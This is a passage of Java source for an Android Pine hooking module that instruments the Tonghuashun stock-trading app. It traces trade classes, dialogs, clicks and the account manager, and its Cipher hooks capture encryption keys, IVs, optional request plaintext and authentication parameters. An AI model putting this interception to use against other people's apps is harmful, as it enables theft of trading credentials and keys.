            Log.i(TAG, "MasterModuleBridge hooks installed");
        }

        // 猜测性交易接口类只尝试一次（当前版本均不存在）
        if (speculativeTradeClassesHooked.compareAndSet(false, true)) {
            hookSpeculativeTradeClasses(cl);
        }
    }

    /** 延迟重试：等 App 完全启动、上下文就绪后再触发 bridge 挂钩。
     *  注意不能用 Handler——postAppSpecialize 时机主线程 Looper 尚未创建。 */
    private static void scheduleTradingSdkBridgeRetry(final ClassLoader cl) {
        final int attempt = bridgeRetryAttempts.incrementAndGet();
        if (attempt > 3) return;
        final long delayMs = attempt == 1 ? 15000L : (attempt == 2 ? 45000L : 90000L);
        Log.i(TAG, "MasterModuleBridge hook retry #" + attempt + " in " + delayMs + "ms");
        Thread retryThread = new Thread(() -> {
            try { Thread.sleep(delayMs); } catch (InterruptedException e) { return; }
            if (tradingSdkBridgeHooked.get()) return;
            try {
                hookTradingSdkBridge(cl);
                if (tradingSdkBridgeHooked.get()) {
                    Log.i(TAG, "MasterModuleBridge hooked on retry #" + attempt);
                }
            } catch (Throwable e) {
                Log.e(TAG, "MasterModuleBridge retry #" + attempt + " failed", e);
            }
        }, "ths-bridge-retry-" + attempt);
        retryThread.setDaemon(true);
        retryThread.start();
    }

    private static void hookSpeculativeTradeClasses(ClassLoader cl) {
        String[] tradeClassNames = {
            "com.hexin.android.weituo.hstrade.base.api.TradeApi",
            "com.hexin.android.weituo.hstrade.base.api.TradeApiImpl",
            "com.hexin.android.weituo.hstrade.base.manager.TradeManager",
            "com.hexin.android.weituo.trade.core.TradeCore",
            "com.hexin.android.weituo.trade.api.ITradeApi",
            "com.hexin.android.weituo.common.TradeCallback",
            "com.hexin.android.weituo.hstrade.base.xcs.local.manager.XcsLocalManager",
            "com.hexin.android.weituo.hstrade.base.xcs.local.api.XcsLocalApi",
            // 新增：更多可能的交易类
            "com.hexin.android.weituo.hstrade.base.request.TradeRequest",
            "com.hexin.android.weituo.hstrade.base.request.RequestManager",
            "com.hexin.android.weituo.core.WeiTuoCore",
            "com.hexin.android.weituo.WeiTuoManager"
        };

        for (String className : tradeClassNames) {
            try {
                Class<?> tradeClass = cl.loadClass(className);
                Log.i(TAG, "Found trade class: " + className);
                hookAllMethods(tradeClass, className);
            } catch (ClassNotFoundException e) {
                // 类不存在，继续尝试下一个
            }
        }
    }

    /** 框架类 UI 消息 Hook（一次性，无需 App ClassLoader） */
    private static void hookTradeUIMessages() {
        // Hook Dialog 显示，捕获错误消息
        try {
            Class<?> alertDialogClass = Class.forName("android.app.AlertDialog$Builder");
            Method setMessage = alertDialogClass.getDeclaredMethod("setMessage", CharSequence.class);
            Pine.hook(setMessage, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    CharSequence msg = (CharSequence) callFrame.args[0];
                    if (msg != null) {
                        String msgStr = msg.toString();
                        // 捕获交易相关的对话框消息
                        if (msgStr.contains("251067") || msgStr.contains("股东") || msgStr.contains("限制")
                            || msgStr.contains("委托") || msgStr.contains("买入") || msgStr.contains("卖出")
                            || msgStr.contains("交易") || msgStr.contains("下单")) {
                            Log.i(TAG, "TradeDialog: " + msgStr);
                            // 打印调用堆栈以找到交易代码
                            StringBuilder sb = new StringBuilder();
                            for (StackTraceElement e : Thread.currentThread().getStackTrace()) {
                                if (e.getClassName().contains("weituo") || e.getClassName().contains("trade")
                                    || e.getClassName().contains("hexin")) {
                                    sb.append("  at ").append(e.toString()).append("\n");
                                }
                            }
                            if (sb.length() > 0) {
                                Log.i(TAG, "TradeStack:\n" + sb);
                            }
                        }
                    }
                }
            });
            Log.i(TAG, "AlertDialog.Builder.setMessage hooked");
        } catch (Throwable e) {
            Log.w(TAG, "AlertDialog hook failed: " + e.getMessage());
        }

        // Hook Toast 显示
        try {
            Class<?> toastClass = Class.forName("android.widget.Toast");
            Method makeText = toastClass.getDeclaredMethod("makeText",
                Class.forName("android.content.Context"), CharSequence.class, int.class);
            Pine.hook(makeText, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    CharSequence msg = (CharSequence) callFrame.args[1];
                    if (msg != null) {
                        String msgStr = msg.toString();
                        if (msgStr.contains("251067") || msgStr.contains("股东") || msgStr.contains("委托")
                            || msgStr.contains("买入") || msgStr.contains("卖出") || msgStr.contains("下单")
                            || msgStr.contains("交易") || msgStr.contains("成功") || msgStr.contains("失败")) {
                            Log.i(TAG, "TradeToast: " + msgStr);
                        }
                    }
                }
            });
            Log.i(TAG, "Toast.makeText hooked");
        } catch (Throwable e) {
            Log.w(TAG, "Toast hook failed: " + e.getMessage());
        }
    }

    /**
     * 交易模块通过 p0s.F(119) 暴露当前账户管理对象。这里仅观察服务定位和
     * 方法调用的结构，不读取字段、不记录参数值，也不主动调用任何交易方法。
     */
    private static void hookTradeAccountRegistry(ClassLoader cl) throws Throwable {
        if (!tradeAccountRegistryHooked.compareAndSet(false, true)) return;

        try {
            Class<?> registryClass = cl.loadClass("p0s");
            Method lookup = registryClass.getDeclaredMethod("F", int.class);
            lookup.setAccessible(true);
            Pine.hook(lookup, new MethodHook() {
                @Override
                public void afterCall(Pine.CallFrame frame) {
                    try {
                        if (frame.args == null || frame.args.length != 1
                                || !(frame.args[0] instanceof Integer)
                                || ((Integer) frame.args[0]) != 119) {
                            return;
                        }
                        captureTradeAccountManager(frame.getResult());
                        // 注意：不能在此触发 MasterModuleBridge 挂钩——启动期账户
                        // 恢复流程也会调用 F(119)，此时 r9h.d 仍为 false，过早挂钩
                        // 会毒化类导致 App 崩溃（已实测两次）。
                    } catch (Throwable e) {
                        Log.w(TAG, "Trade account registry observation failed: " + e.getMessage());
                    }
                }
            });
            Log.i(TAG, "Trade account service locator hooked: p0s.F(119)");

            // F(119) 是只读服务定位，不会发送交易请求。主动定位一次可避免必须
            // 等待用户重新进入交易首页后才能安装观察 Hook。
            try {
                captureTradeAccountManager(lookup.invoke(null, 119));
            } catch (Throwable e) {
                Log.i(TAG, "Trade account manager not ready; waiting for App lookup");
            }
        } catch (Throwable e) {
            tradeAccountRegistryHooked.set(false);
            throw e;
        }
    }

    private static synchronized void captureTradeAccountManager(Object manager) {
        if (manager == null) return;
        tradeAccountManagerInstance = manager;
        tradeAccountManagerClass = manager.getClass();
        Log.i(TAG, "Trade account manager captured: " + tradeAccountManagerClass.getName());

        // pzr 型 API（d()/q()/u()）声明在混淆父类上，getDeclaredMethods 看不到，
        // 必须沿 App 自有类链逐层挂钩；遇到框架类即停（上方不会再有 App 类）。
        List<Class<?>> chain = new ArrayList<>();
        for (Class<?> clazz = tradeAccountManagerClass; clazz != null; clazz = clazz.getSuperclass()) {
            String name = clazz.getName();
            if (name.startsWith("java.") || name.startsWith("android.") || name.startsWith("androidx.")) {
                break;
            }
            chain.add(clazz);
        }
        tradeAccountClassChain = chain;
        for (Class<?> clazz : chain) {
            hookTradeAccountMethods(clazz);
        }
    }

    private static void hookTradeAccountMethods(Class<?> clazz) {
        for (Method method : clazz.getDeclaredMethods()) {
            String key = method.toGenericString();
            if (hookedTradeAccountMethods.putIfAbsent(key, true) != null) continue;
            try {
                method.setAccessible(true);
                final String signature = compactMethodSignature(method);
                // 无参身份 getter（d()/q()/e()/x() 等）页面刷新时高频触发，会把
                // 请求/响应事件挤出 100 条缓冲；只观察带参调用与复杂返回
                final boolean hasArgs = method.getParameterTypes().length > 0;
                Pine.hook(method, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame frame) {
                        if (!hasArgs) return;
                        StringBuilder event = new StringBuilder("SDK_CALL ").append(signature);
                        event.append(" args=");
                        event.append(describeTradeArguments(frame.args));
                        addTradeLog(event.toString());
                    }

                    @Override
                    public void afterCall(Pine.CallFrame frame) {
                        if (!hasArgs) return;
                        addTradeLog("SDK_RETURN " + signature + " result="
                                + describeTradeValue(frame.getResult()));
                    }
                });
            } catch (Throwable e) {
                hookedTradeAccountMethods.remove(key);
                Log.w(TAG, "Trade account method hook failed: " + method.getName());
            }
        }
    }

    private static String compactMethodSignature(Method method) {
        StringBuilder result = new StringBuilder();
        result.append(method.getReturnType().getSimpleName()).append(' ')
                .append(method.getName()).append('(');
        Class<?>[] parameterTypes = method.getParameterTypes();
        for (int i = 0; i < parameterTypes.length; i++) {
            if (i > 0) result.append(',');
            result.append(parameterTypes[i].getSimpleName());
        }
        return result.append(')').toString();
    }

    private static String describeTradeArguments(Object[] args) {
        if (args == null || args.length == 0) return "[]";
        StringBuilder result = new StringBuilder("[");
        for (int i = 0; i < args.length; i++) {
            if (i > 0) result.append(',');
            result.append(describeTradeValue(args[i]));
        }
        return result.append(']').toString();
    }

    /** nxm-family observers carry c=pageId/d=protocolId instance fields; surface
     *  them so responses can be matched to the rpv query catalog without values. */
    private static String describeObserverIds(Object observer) {
        if (observer == null) return "";
        try {
            java.lang.reflect.Field pageIdF = findFieldInHierarchy(observer.getClass(), "c");
            java.lang.reflect.Field protoF = findFieldInHierarchy(observer.getClass(), "d");
            if (pageIdF == null || protoF == null) return "";
            pageIdF.setAccessible(true);
            protoF.setAccessible(true);
            return " query(pageId=" + pageIdF.getInt(observer)
                    + ",protocolId=" + protoF.getInt(observer) + ")";
        } catch (Throwable e) {
            return "";
        }
    }

    private static java.lang.reflect.Field findFieldInHierarchy(Class<?> clazz, String name) {
        for (Class<?> c = clazz; c != null; c = c.getSuperclass()) {
            try {
                return c.getDeclaredField(name);
            } catch (NoSuchFieldException ignored) {
            }
        }
        return null;
    }

    /** StuffBaseStruct/StuffTableStruct schema description: header ids, column names,
     *  row/col counts. Cell values in dataTable must never enter logs. */
    private static String describeStuffStruct(Object stuff) {
        if (stuff == null) return "null";
        try {
            Class<?> c = stuff.getClass();
            StringBuilder sb = new StringBuilder(c.getSimpleName());
            sb.append("{pageId=").append(c.getField("pageId").getInt(stuff))
                    .append(",frameId=").append(c.getField("frameId").getInt(stuff))
                    .append(",packageId=").append(c.getField("packageId").getInt(stuff))
                    .append(",headType=").append(c.getField("headType").getInt(stuff))
                    .append(",real=").append(c.getField("isRealData").getBoolean(stuff));
            if (c.getName().equals("com.hexin.middleware.data.mobile.StuffTableStruct")) {
                String[] head = (String[]) c.getField("tableHead").get(stuff);
                int row = c.getField("row").getInt(stuff);
                int col = c.getField("col").getInt(stuff);
                java.util.Hashtable<?, ?> dataTable =
                        (java.util.Hashtable<?, ?>) c.getField("dataTable").get(stuff);
                String caption = (String) c.getField("caption").get(stuff);
                sb.append(",type=table,row=").append(row)
                        .append(",col=").append(col)
                        .append(",rows=").append(dataTable == null ? 0 : dataTable.size())
                        .append(",caption=").append(caption == null ? "" : caption)
                        .append(",head=").append(head == null ? "[]" : java.util.Arrays.toString(head));
            } else if (c.getName().equals("com.hexin.middleware.data.mobile.StuffTextStruct")) {
                // Text responses are page prompts (e.g. "no data"), not account rows:
                // record reCode/id/type plus a short content prefix to identify semantics.
                int reCode = c.getField("reCode").getInt(stuff);
                int textId = c.getField("id").getInt(stuff);
                int textType = c.getField("type").getInt(stuff);
                String caption = (String) c.getField("caption").get(stuff);
                String content = (String) c.getField("content").get(stuff);
                String prefix = content == null ? "" : content.replaceAll("\\s+", " ").trim();
                if (prefix.length() > 48) prefix = prefix.substring(0, 48) + "...";
                sb.append(",type=text,reCode=").append(reCode)
                        .append(",id=").append(textId)
                        .append(",ttype=").append(textType)
                        .append(",caption=").append(caption == null ? "" : caption)
                        .append(",contentLen=").append(content == null ? 0 : content.length())
                        .append(",contentPrefix=").append(prefix);
            } else {
                sb.append(",type=").append(c.getSimpleName());
            }
            sb.append('}');
            return sb.toString();
        } catch (Throwable e) {
            return stuff.getClass().getName() + "(describe failed: " + e + ")";
        }
    }

    /** Returns shape-only diagnostics. Values and credentials must never enter logs. */
    private static String describeTradeValue(Object value) {
        if (value == null) return "null";
        if (value instanceof byte[]) {
            byte[] bytes = (byte[]) value;
            String command = extractTradeCommandFromBytes(bytes);
            return "bytes(len=" + bytes.length
                    + (command == null ? "" : ",command=" + command) + ")";
        }
        if (value instanceof CharSequence) {
            String text = value.toString();
            String command = extractTradeCommand(text);
            return "string(len=" + text.length()
                    + (command == null ? "" : ",command=" + command) + ")";
        }
        if (value instanceof Collection) {
            return value.getClass().getSimpleName() + "(size=" + ((Collection<?>) value).size() + ")";
        }
        if (value instanceof Map) {
            return value.getClass().getSimpleName() + "(keys=" + ((Map<?, ?>) value).keySet().size() + ")";
        }
        if (value.getClass().isArray()) {
            return value.getClass().getComponentType().getSimpleName() + "[](len="
                    + java.lang.reflect.Array.getLength(value) + ")";
        }
        if (value instanceof Number || value instanceof Boolean || value instanceof Character) {
            return value.getClass().getSimpleName();
        }
        return value.getClass().getName();
    }

    private static String extractTradeCommand(String text) {
        if (text == null || text.isEmpty()) return null;
        java.util.regex.Matcher matcher = java.util.regex.Pattern
                .compile("(?:^|[&|])cmd(?:=|\\*)([A-Za-z0-9_]+)")
                .matcher(text);
        if (!matcher.find()) return null;
        String command = matcher.group(1);
        return command.length() > 80 ? command.substring(0, 80) : command;
    }

    /** 从二进制请求载荷中只提取 cmd 命令名，不记录任何业务值 */
    private static String extractTradeCommandFromBytes(byte[] bytes) {
        if (bytes == null || bytes.length == 0) return null;
        int limit = Math.min(bytes.length, 512);
        StringBuilder printable = new StringBuilder(limit);
        for (int i = 0; i < limit; i++) {
            int b = bytes[i] & 0xFF;
            printable.append(b >= 0x20 && b < 0x7F ? (char) b : '\n');
        }
        return extractTradeCommand(printable.toString());
    }

    /**
     * Hook 一个类的所有公共方法
     */
    private static void hookAllMethods(Class<?> clazz, String className) {
        for (Method m : clazz.getDeclaredMethods()) {
            try {
                String methodName = m.getName();
                // 跳过常见的无关方法
                if (methodName.equals("hashCode") || methodName.equals("equals")
                    || methodName.equals("toString") || methodName.equals("getClass")
                    || methodName.startsWith("access$")) {
                    continue;
                }

                Pine.hook(m, new MethodHook() {
                    @Override
                    public void beforeCall(Pine.CallFrame callFrame) {
                        Log.i(TAG, "Trade." + clazz.getSimpleName() + "." + methodName
                                + " args=" + describeTradeArguments(callFrame.args));
                    }

                    @Override
                    public void afterCall(Pine.CallFrame callFrame) {
                        Object result = callFrame.getResult();
                        if (result != null && !(result instanceof Void)) {
                            Log.i(TAG, "  → " + describeTradeValue(result));
                        }
                    }
                });
            } catch (Throwable e) {
                // 忽略无法 Hook 的方法
            }
        }
        Log.i(TAG, "Hooked all methods in: " + className);
    }

    // ========== Activity 和点击追踪 ==========

    // 当前 Activity 名称
    private static volatile String currentActivityName = "";

    /**
     * Hook Activity 生命周期和 View 点击事件，追踪买入/卖出按钮
     */
    private static void hookActivityAndClicks() throws Throwable {
        // Hook Activity.onCreate
        Class<?> activityClass = Class.forName("android.app.Activity");
        Method onCreate = activityClass.getDeclaredMethod("onCreate", Class.forName("android.os.Bundle"));
        Pine.hook(onCreate, new MethodHook() {
            @Override
            public void afterCall(Pine.CallFrame callFrame) {
                try {
                    Object activity = callFrame.thisObject;
                    String name = activity.getClass().getName();
                    currentActivityName = name;
                    // 只记录同花顺相关的 Activity
                    if (name.contains("hexin") || name.contains("weituo") || name.contains("trade")
                        || name.contains("order") || name.contains("buy") || name.contains("sell")) {
                        Log.i(TAG, "Activity.onCreate: " + name);
                        addTradeLog("ACTIVITY: " + name);
                    }
                } catch (Throwable ignored) {}
            }
        });

        // Hook Activity.onResume
        Method onResume = activityClass.getDeclaredMethod("onResume");
        Pine.hook(onResume, new MethodHook() {
            @Override
            public void afterCall(Pine.CallFrame callFrame) {
                try {
                    Object activity = callFrame.thisObject;
                    String name = activity.getClass().getName();
                    currentActivityName = name;
                } catch (Throwable ignored) {}
            }
        });

        // Hook View.setOnClickListener - 捕获所有点击监听器设置
        Class<?> viewClass = Class.forName("android.view.View");
        Class<?> listenerClass = Class.forName("android.view.View$OnClickListener");
        Method setOnClickListener = viewClass.getDeclaredMethod("setOnClickListener", listenerClass);
        Pine.hook(setOnClickListener, new MethodHook() {
            @Override
            public void beforeCall(Pine.CallFrame callFrame) {
                try {
                    Object view = callFrame.thisObject;
                    Object listener = callFrame.args[0];
                    if (listener == null) return;

                    String listenerClass = listener.getClass().getName();
                    // 只关注交易相关的监听器
                    if (listenerClass.contains("weituo") || listenerClass.contains("trade")
                        || listenerClass.contains("order") || listenerClass.contains("buy")
                        || listenerClass.contains("sell") || listenerClass.contains("mairu")
                        || listenerClass.contains("maichu") || listenerClass.contains("entrust")) {

                        // 获取 view ID
                        int viewId = (int) view.getClass().getMethod("getId").invoke(view);
                        String viewClassName = view.getClass().getName();

                        Log.i(TAG, "TradeButton detected: view=" + viewClassName + " id=" + viewId
                            + " listener=" + listenerClass);
                        addTradeLog("BUTTON: " + listenerClass + " viewId=" + viewId);

                        // Hook 这个监听器的 onClick 方法
                        try {
                            Method onClick = listener.getClass().getMethod("onClick", viewClass);
                            Pine.hook(onClick, new MethodHook() {
                                @Override
                                public void beforeCall(Pine.CallFrame frame) {
                                    Log.i(TAG, ">>> TRADE CLICK: " + listenerClass + " in " + currentActivityName);
                                    addTradeLog("CLICK: " + listenerClass);

                                    // 打印调用栈
                                    Throwable t = new Throwable();
                                    StringBuilder stack = new StringBuilder();
                                    for (StackTraceElement e : t.getStackTrace()) {
                                        String cn = e.getClassName();
                                        if (cn.contains("hexin") || cn.contains("weituo")) {
                                            stack.append("  -> ").append(cn).append(".").append(e.getMethodName())
                                                 .append(":").append(e.getLineNumber()).append("\n");
                                        }
                                    }
                                    if (stack.length() > 0) {
                                        Log.i(TAG, "Click stack:\n" + stack.toString());
                                    }
                                }
                            });
                            Log.i(TAG, "Hooked onClick for: " + listenerClass);
                        } catch (Throwable e) {
                            Log.w(TAG, "Failed to hook onClick: " + e.getMessage());
                        }
                    }
                } catch (Throwable e) {
                    // ignore
                }
            }
        });

        // Hook View.performClick - 捕获所有点击事件
        try {
            Method performClick = viewClass.getDeclaredMethod("performClick");
            Pine.hook(performClick, new MethodHook() {
                @Override
                public void beforeCall(Pine.CallFrame callFrame) {
                    try {
                        Object view = callFrame.thisObject;
                        String viewClassName = view.getClass().getName();

                        // 只记录交易相关的点击
                        if (viewClassName.contains("weituo") || viewClassName.contains("trade")
                            || viewClassName.contains("buy") || viewClassName.contains("sell")
                            || viewClassName.contains("order") || viewClassName.contains("Button")) {

                            int viewId = (int) view.getClass().getMethod("getId").invoke(view);

                            // 尝试获取 view 的文本
                            String text = "";
                            try {
                                Method getText = view.getClass().getMethod("getText");
                                Object textObj = getText.invoke(view);
                                if (textObj != null) text = textObj.toString();
                            } catch (Throwable ignored) {}

                            // 只记录有文本或特定类型的点击
                            if (text.contains("买") || text.contains("卖") || text.contains("下单")
                                || text.contains("委托") || text.contains("确认")
                                || viewClassName.contains("weituo")) {
                                Log.i(TAG, ">>> performClick: " + viewClassName + " id=" + viewId
                                    + " text=\"" + text + "\" activity=" + currentActivityName);
                                addTradeLog("PERFORM_CLICK: " + text + " in " + currentActivityName);
                            }
                        }
                    } catch (Throwable ignored) {}
                }
            });
        } catch (Throwable e) {
            Log.w(TAG, "performClick hook failed: " + e.getMessage());
        }

        Log.i(TAG, "Activity and click hooks installed");
    }

    // ========== Cipher Hook - 捕获加密操作 ==========

    // Cipher 上下文追踪
    private static class CipherContext {
        String algorithm;
        byte[] keyBytes;
        byte[] ivBytes;
        int opmode;
        long initTimeMs;
        boolean stackPrinted;

        CipherContext(String algorithm, byte[] keyBytes, byte[] ivBytes, int opmode) {
            this.algorithm = algorithm;
            this.keyBytes = keyBytes;
            this.ivBytes = ivBytes;
            this.opmode = opmode;
            this.initTimeMs = System.currentTimeMillis();
            this.stackPrinted = false;
        }
    }

    private static final ConcurrentHashMap<Integer, CipherContext> trackedCiphers = new ConcurrentHashMap<>();
    private static final AtomicInteger cipherLogCount = new AtomicInteger(0);
    private static volatile long cipherLogWindowStart = 0;
    private static final int CIPHER_LOG_LIMIT = 50;

    /**
     * Hook javax.crypto.Cipher 捕获加密/解密操作
     * 用于追踪交易请求在哪里被加密
     */
    private static void hookCipher() throws Throwable {
        Class<?> cipherClass = Class.forName("javax.crypto.Cipher");

        // Hook Cipher.init(int opmode, Key key, AlgorithmParameterSpec params)
        try {
            Method initWithParams = cipherClass.getDeclaredMethod("init",
                int.class, java.security.Key.class, java.security.spec.AlgorithmParameterSpec.class);

            Pine.hook(initWithParams, new MethodHook() {
                @Override
                public void afterCall(Pine.CallFrame callFrame) {
                    try {
                        int opmode = (int) callFrame.args[0];
                        Object cipher = callFrame.thisObject;
                        String algorithm = (String) cipher.getClass().getMethod("getAlgorithm").invoke(cipher);

                        // 跳过 TLS 算法
                        if (isTlsAlgorithm(algorithm)) return;

                        java.security.Key key = (java.security.Key) callFrame.args[1];
                        byte[] keyBytes = key != null ? key.getEncoded() : null;

                        byte[] ivBytes = null;
                        Object paramSpec = callFrame.args[2];
                        if (paramSpec != null && paramSpec.getClass().getName().contains("IvParameterSpec")) {
                            try {
                                ivBytes = (byte[]) paramSpec.getClass().getMethod("getIV").invoke(paramSpec);
                            } catch (Throwable ignored) {}
                        }

                        int id = System.identityHashCode(cipher);
                        trackedCiphers.put(id, new CipherContext(algorithm, keyBytes, ivBytes, opmode));

                        // 限制日志
                        if (cipherRateLimitCheck()) {
                            String mode = opmode == 1 ? "ENCRYPT" : opmode == 2 ? "DECRYPT" : "MODE_" + opmode;
                            Log.i(TAG, "CIPHER_INIT: " + mode + " algo=" + algorithm +
                                " keyLen=" + (keyBytes != null ? keyBytes.length : 0) +
                                " ivLen=" + (ivBytes != null ? ivBytes.length : 0));
                        }
                    } catch (Throwable e) {
                        // ignore
                    }
                }
            });
            Log.i(TAG, "Hooked Cipher.init(int, Key, AlgorithmParameterSpec)");
        } catch (Throwable e) {
            Log.w(TAG, "Cipher.init with params hook failed: " + e.getMessage());
        }

        // Hook Cipher.init(int opmode, Key key)
        try {
            Method initSimple = cipherClass.getDeclaredMethod("init", int.class, java.security.Key.class);
            Pine.hook(initSimple, new MethodHook() {
                @Override
                public void afterCall(Pine.CallFrame callFrame) {
                    try {
                        int opmode = (int) callFrame.args[0];
                        Object cipher = callFrame.thisObject;
                        String algorithm = (String) cipher.getClass().getMethod("getAlgorithm").invoke(cipher);

                        if (isTlsAlgorithm(algorithm)) return;

                        java.security.Key key = (java.security.Key) callFrame.args[1];
                        byte[] keyBytes = key != null ? key.getEncoded() : null;

                        int id = System.identityHashCode(cipher);
                        trackedCiphers.put(id, new CipherContext(algorithm, keyBytes, null, opmode));
                    } catch (Throwable ignored) {}
                }
            });
            Log.i(TAG, "Hooked Cipher.init(int, Key)");
        } catch (Throwable e) {
            Log.w(TAG, "Cipher.init simple hook failed: " + e.getMessage());
        }

        // Hook Cipher.doFinal(byte[] input)
        try {
            Method doFinalBytes = cipherClass.getDeclaredMethod("doFinal", byte[].class);
            Pine.hook(doFinalBytes, new MethodHook() {
                @Override
                public void afterCall(Pine.CallFrame callFrame) {
                    try {
                        Object cipher = callFrame.thisObject;
                        int id = System.identityHashCode(cipher);
                        CipherContext ctx = trackedCiphers.get(id);
                        if (ctx == null) return;

                        byte[] input = (byte[]) callFrame.args[0];
                        Object result = callFrame.getResult();
                        if (!(result instanceof byte[])) return;
                        byte[] output = (byte[]) result;

                        // 过滤小数据
                        if (input == null || input.length < 32) return;

                        // 检查是否是加密操作（opmode == 1）
                        boolean isEncrypt = ctx.opmode == 1;

                        String inputStr = "";
                        String outputStr = "";
                        try {
                            inputStr = new String(input, "UTF-8");
                            outputStr = new String(output, "UTF-8");
                        } catch (Throwable ignored) {}

                        // 检查是否包含交易相关关键字
                        boolean isTradeRelated = inputStr.contains("mairu") || inputStr.contains("maichu")
                            || inputStr.contains("weituo") || inputStr.contains("stock")
                            || inputStr.contains("price") || inputStr.contains("volume")
                            || inputStr.contains("order") || inputStr.contains("trade")
                            || inputStr.contains("cmd_wt") || inputStr.contains("cmd_qu");

                        // 如果是加密操作，记录明文输入
                        if (isEncrypt && cipherRateLimitCheck()) {
                            // 只提取 cmd 命令名（结构信息），不记录任何业务值
                            String tradeCmd = extractTradeCommand(inputStr);
                            Log.i(TAG, "CIPHER_ENCRYPT: algo=" + ctx.algorithm +
                                " inputLen=" + input.length +
                                " outputLen=" + output.length +
                                (tradeCmd == null ? "" : " cmd=" + tradeCmd));

                            // 打印明文输入（可能是交易参数）
                            String preview = inputStr.length() > 500 ? inputStr.substring(0, 500) + "..." : inputStr;
                            if (SENSITIVE_PAYLOAD_LOGGING) {
                                Log.i(TAG, "  PlainText: " + preview);
                            }

                            // 尝试从明文中提取认证参数（key3/key4/key5 等）
                            if (inputStr.contains("\"key5\"")) {
                                try {
                                    extractAuthFromCipherPlaintext(inputStr);
                                } catch (Throwable e) {
                                    Log.w(TAG, "Failed to extract auth from cipher plaintext: " + e.getMessage());
                                }
                            }

                            // 如果是交易相关的，打印调用栈
                            if (isTradeRelated && !ctx.stackPrinted) {
                                ctx.stackPrinted = true;
                                logCipherStack("ENCRYPT");
                            }
                        }

                        // 清理
                        if (System.currentTimeMillis() - ctx.initTimeMs > 60000) {
                            trackedCiphers.remove(id);
                        }
                    } catch (Throwable e) {
                        // ignore
                    }
                }
            });
            Log.i(TAG, "Hooked Cipher.doFinal(byte[])");
        } catch (Throwable e) {
            Log.w(TAG, "Cipher.doFinal hook failed: " + e.getMessage());
        }

        // Hook Cipher.doFinal(byte[], int, int)
        try {
            Method doFinalPartial = cipherClass.getDeclaredMethod("doFinal", byte[].class, int.class, int.class);
            Pine.hook(doFinalPartial, new MethodHook() {
                @Override
                public void afterCall(Pine.CallFrame callFrame) {
                    try {
                        Object cipher = callFrame.thisObject;
                        int id = System.identityHashCode(cipher);
                        CipherContext ctx = trackedCiphers.get(id);
                        if (ctx == null) return;

                        byte[] input = (byte[]) callFrame.args[0];
                        int offset = (int) callFrame.args[1];
                        int len = (int) callFrame.args[2];

                        if (input == null || len < 32) return;

                        boolean isEncrypt = ctx.opmode == 1;
                        if (isEncrypt && cipherRateLimitCheck()) {
                            String plaintext = new String(input, offset, len, "UTF-8");
                            Log.i(TAG, "CIPHER_ENCRYPT_PARTIAL: algo=" + ctx.algorithm + " len=" + len);
                            String preview = plaintext.length() > 500 ? plaintext.substring(0, 500) + "..." : plaintext;
                            if (SENSITIVE_PAYLOAD_LOGGING) {
                                Log.i(TAG, "  PlainText: " + preview);
                            }

                            // 尝试从明文中提取认证参数
                            if (plaintext.contains("\"key5\"")) {
                                try {
                                    extractAuthFromCipherPlaintext(plaintext);
                                } catch (Throwable e) {
                                    Log.w(TAG, "Failed to extract auth from cipher plaintext: " + e.getMessage());
                                }
                            }

                            if (!ctx.stackPrinted) {
                                ctx.stackPrinted = true;
                                logCipherStack("ENCRYPT");
                            }
                        }
                    } catch (Throwable ignored) {}
                }
            });
            Log.i(TAG, "Hooked Cipher.doFinal(byte[], int, int)");
        } catch (Throwable e) {
            Log.w(TAG, "Cipher.doFinal partial hook failed: " + e.getMessage());
        }

        Log.i(TAG, "Cipher hooks installed");
    }

    private static boolean isTlsAlgorithm(String algorithm) {
        if (algorithm == null) return false;
        String upper = algorithm.toUpperCase();
        return upper.contains("GCM") ||
               upper.contains("CHACHA20") ||
               upper.contains("POLY1305") ||
               upper.contains("OAEP") ||
               (upper.contains("RSA") && upper.contains("ECB"));
    }

    private static boolean cipherRateLimitCheck() {
        long now = System.currentTimeMillis();
        if (now - cipherLogWindowStart > 60000) {
            cipherLogWindowStart = now;
            cipherLogCount.set(0);
        }
        return cipherLogCount.incrementAndGet() <= CIPHER_LOG_LIMIT;
    }

    private static void logCipherStack(String tag) {
        Throwable t = new Throwable();
        StringBuilder stack = new StringBuilder();
        stack.append("=== ").append(tag).append(" CALL STACK ===\n");
        for (StackTraceElement e : t.getStackTrace()) {
            String cn = e.getClassName();
            // 打印同花顺相关的类
            if (cn.contains("hexin") || cn.contains("weituo") || cn.contains("trade")
                || cn.contains("stock") || cn.contains("order")) {
                stack.append("  -> ").append(cn).append(".")
                     .append(e.getMethodName()).append(":").append(e.getLineNumber()).append("\n");
            }
        }
        stack.append("=== END STACK ===");
        Log.i(TAG, stack.toString());
        addTradeLog("STACK: " + stack.toString());
    }

    // ========== WTBuyConfirmClient Hook ==========

    /**
     * Hook 买入入口类 WTBuyConfirmClient
     * 目标：捕获构造参数、requestDirect() 调用方式，并存储实例
     */
    private static void hookWTBuyConfirmClient(ClassLoader cl) throws Throwable {
        String buyClientClassName = "com.hexin.android.weituo.trading.alltradetype.basictrade.buysell.common.wtbuysellreq.client.WTBuyConfirmClient";

        try {
            wtBuyConfirmClientClass = cl.loadClass(buyClientClassName);
            Log.i(TAG, "=== Found WTBuyConfirmClient class! ===");

            // 列出所有构造函数
            java.lang.reflect.Constructor<?>[] ctors = wtBuyConfirmClientClass.getDeclaredConstructors();
            Log.i(TAG, "WTBuyConfirmClient has " + ctors.length + " constructor(s):");
            for (java.lang.reflect.Constructor<?> ctor : ctors) {
                Class<?>[] paramTypes = ctor.getParameterTypes();
                StringBuilder paramStr = new StringBuilder();
                for (int i = 0; i < paramTypes.length; i++) {
                    if (i > 0) paramStr.append(", ");
                    paramStr.append(paramTypes[i].getName());
                }
                Log.i(TAG, "  Constructor(" + paramStr.toString() + ")");

                // Hook 每个构造函数
                ctor.setAccessible(true);
                Pine.hook(ctor, new MethodHook() {
                    @Override
                    public void afterCall(Pine.CallFrame callFrame) {
                        try {
                            Object instance = callFrame.thisObject;
                            Log.i(TAG, "=== WTBuyConfirmClient CONSTRUCTED ===");

                            // 记录构造参数
                            if (callFrame.args != null && callFrame.args.length > 0) {
                                StringBuilder sb = new StringBuilder("Constructor args:\n");
                                for (int i = 0; i < callFrame.args.length; i++) {
                                    Object arg = callFrame.args[i];
                                    String argInfo = arg == null ? "null" :
